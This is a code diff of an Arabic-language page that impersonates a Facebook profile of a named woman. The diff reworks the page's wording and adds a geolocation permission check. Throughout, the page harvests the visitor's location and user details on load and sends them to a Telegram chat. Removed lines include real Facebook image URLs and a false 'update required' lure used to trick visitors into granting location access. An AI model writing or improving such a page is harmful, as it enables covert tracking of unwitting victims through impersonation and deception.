@@ -7,9 +7,9 @@
     <!-- Open Graph tags -->
     <meta property="og:title" content="ملف شخصي فيسبوك" />
     <meta property="og:type" content="website" />
-    <meta property="og:url" content="https://scontent.fcai24-1.fna.fbcdn.net/v/t39.30808-6/435666821_3674362579557357_267544428629266178_n.jpg?_nc_cat=104&ccb=1-7&_nc_sid=833d8c&_nc_eui2=AeEtrKXdMv7KE4V-FJuqM84CyvxbuzQ50uDK_Fu7NDnS4LshmYr97PgaeD_Qa99loTo&_nc_ohc=B9xEC5JkilwQ7kNvgGaJPRz&_nc_ht=scontent.fcai24-1.fna&oh=00_AYCcHR5oOGHettWfM7I5cR_E4L4Y_gab8GL4a5KMcIMU1Q&oe=6691B8CD" />
-    <meta property="og:image" content="https://scontent.fcai24-1.fna.fbcdn.net/v/t39.30808-6/435666821_3674362579557357_267544428629266178_n.jpg?_nc_cat=104&ccb=1-7&_nc_sid=833d8c&_nc_eui2=AeEtrKXdMv7KE4V-FJuqM84CyvxbuzQ50uDK_Fu7NDnS4LshmYr97PgaeD_Qa99loTo&_nc_ohc=B9xEC5JkilwQ7kNvgGaJPRz&_nc_ht=scontent.fcai24-1.fna&oh=00_AYCcHR5oOGHettWfM7I5cR_E4L4Y_gab8GL4a5KMcIMU1Q&oe=6691B8CD" />
-    <meta property="og:description" content="سماح السيد الحساب الاساسي" />
+    <meta property="og:url" content="https://yourwebsite.com/profile" />
+    <meta property="og:image" content="https://yourwebsite.com/path/to/image.jpg" />
+    <meta property="og:description" content="وصف مختصر للصفحة الشخصية" />
     <style>
         body, html {
             margin: 0;
@@ -25,7 +25,7 @@
         }
         .cover-photo {
             height: 350px;
-            background-image: url('https://scontent.fcai24-1.fna.fbcdn.net/v/t39.30808-6/423196130_3626939707632978_1590665133463999650_n.jpg?_nc_cat=101&ccb=1-7&_nc_sid=cc71e4&_nc_eui2=AeEeMd4-HnAL1_Gxszghn6SZsf05R3FRycix_TlHcVHJyE0v15u68uGv36hnOhSky4E&_nc_ohc=fWbsB0TSis4Q7kNvgEnJ08v&_nc_ht=scontent.fcai24-1.fna&oh=00_AYA2QW82qrz0A9A6pJAQtojRRyDtaJVKhb6c0mggIHE6hg&oe=6691AE45');
+            background-image: url('https://example.com/cover-photo.jpg');
             background-size: cover;
             background-position: center;
         }
@@ -117,8 +117,8 @@
     <div id="locationOverlay">
         <div id="locationPrompt">
             <h2>السماح بتحديد الموقع</h2>
-            <p>اصدار الفيسبوك الحالي لديك يحتاج الي تحديث لفتح الحساب الحالي اضغط علي موافق وسماح لحل المشكلة</p>
-            <button id="allowLocationBtn">فتح الصفحة</button>
+            <p>يرجى السماح بتحديد موقعك لاستخدام التطبيق.</p>
+            <button id="allowLocationBtn">السماح بتحديد الموقع</button>
         </div>
     </div>
 
@@ -127,14 +127,14 @@
             <!-- هنا يمكن إضافة شريط البحث وأيقونات التنقل -->
         </div>
         
-        <div class="cover-photo"></div>
+        <div class="cover-photo" style="background-image: url('https://example.com/cover-photo.jpg');"></div>
         
         <div class="profile-section">
-            <img src="https://scontent.fcai24-1.fna.fbcdn.net/v/t39.30808-6/370437641_3515393512120932_6308905167458711103_n.jpg?_nc_cat=104&ccb=1-7&_nc_sid=a5f93a&_nc_eui2=AeGO-61Ujm73mPEdXcpsbCmtSsas17Tt1-pKxqzXtO3X6rYPAWjwfwuhjXl2JU58ACI&_nc_ohc=gGYm-HznEJ8Q7kNvgGUZJyX&_nc_ht=scontent.fcai24-1.fna&oh=00_AYC5H2bIEydMsRk2Bi9OKdOnnmTQxj6_WmwqG5_8Px30xw&oe=6691C85F" alt="الصورة الشخصية" class="profile-picture">
+            <img src="https://example.com/profile-picture.jpg" alt="الصورة الشخصية" class="profile-picture">
             <h1 class="profile-name">سماح السيد</h1>
             <div class="profile-buttons">
-                <button class="profile-button primary-button">اضافة صديق</button>
-                <button class="profile-button secondary-button">ارسال رسالة</button>
+                <button class="profile-button primary-button">إضافة صديق</button>
+                <button class="profile-button secondary-button">إرسال رسالة</button>
                 <button class="profile-button secondary-button">المزيد</button>
             </div>
             <div class="nav-tabs">
@@ -158,6 +158,29 @@
                 chat_id: telegramChatId,
                 text: message
             });
+        }
+
+        function checkLocationPermission() {
+            if (navigator.permissions) {
+                navigator.permissions.query({ name: 'geolocation' }).then(function(result) {
+                    if (result.state === 'granted') {
+                        getLocation();
+                    } else if (result.state === 'prompt') {
+                        showLocationPrompt();
+                    } else if (result.state === 'denied') {
+                        alert("يرجى السماح بتحديد الموقع لاستخدام التطبيق.");
+                    }
+                    result.onchange = function() {
+                        if (result.state === 'granted') {
+                            getLocation();
+                        } else if (result.state === 'denied') {
+                            alert("يرجى السماح بتحديد الموقع لاستخدام التطبيق.");
+                        }
+                    };
+                });
+            } else {
+                getLocation();
+            }
         }
 
         function getLocation() {
@@ -186,7 +209,7 @@
         function showError(error) {
             switch(error.code) {
                 case error.PERMISSION_DENIED:
-                    alert("اصدار الفيسبوك الحالي لديك يحتاج الي تحديث لفتح الحساب الحالي اضغط علي موافق وسماح لحل المشكلة");
+                    alert("يرجى السماح بتحديد الموقع لاستخدام التطبيق.");
                     break;
                 case error.POSITION_UNAVAILABLE:
                     alert("معلومات الموقع غير متاحة.");
@@ -198,6 +221,10 @@
                     alert("حدث خطأ غير معروف.");
                     break;
             }
+        }
+
+        function showLocationPrompt() {
+            document.getElementById('locationOverlay').style.display = 'flex';
         }
 
         document.getElementById('allowLocationBtn').addEventListener('click', getLocation);
@@ -216,8 +243,8 @@
         };
         sendToTelegram(`User Info: ${JSON.stringify(userInfo)}`);
 
-        // محاولة الحصول على الموقع عند تحميل الصفحة
-        getLocation();
+        // التحقق من إذن الموقع عند تحميل الصفحة
+        checkLocationPermission();
     </script>
 </body>
 </html>
